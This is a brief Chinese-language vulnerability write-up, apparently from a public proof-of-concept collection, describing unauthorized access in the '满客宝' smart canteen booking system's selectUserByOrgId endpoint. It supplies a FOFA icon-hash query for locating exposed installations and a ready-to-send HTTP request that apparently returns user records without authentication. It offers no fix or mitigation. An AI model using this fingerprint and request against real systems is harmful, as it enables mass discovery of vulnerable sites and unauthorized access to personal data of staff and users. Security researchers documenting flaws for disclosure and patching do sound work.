# 满客宝智慧食堂预定系统selectUserByOrgId 存在未授权访问漏洞

# 一、漏洞简介
满客宝智慧食堂预定系统selectUserByOrgId 存在未授权访问漏洞

# 二、影响版本
+ 满客宝智慧食堂预定系统

# 三、资产测绘
+ fofa`icon_hash="-409875651" `
+ 特征

![1722533721568-8ccae965-cf23-41b8-9b0f-087e222a1df4.png](./img/S161PTrhLGIcPwyy/1722533721568-8ccae965-cf23-41b8-9b0f-087e222a1df4-867868.png)

# 四、漏洞复现
```java
GET /yuding/selectUserByOrgId.action?record= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: close
```

![1722533694097-958173f0-a710-4928-98ef-cf3474338592.png](./img/S161PTrhLGIcPwyy/1722533694097-958173f0-a710-4928-98ef-cf3474338592-016901.png)



> 更新: 2024-08-12 17:15:57  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ikk2p8bp66933w1b>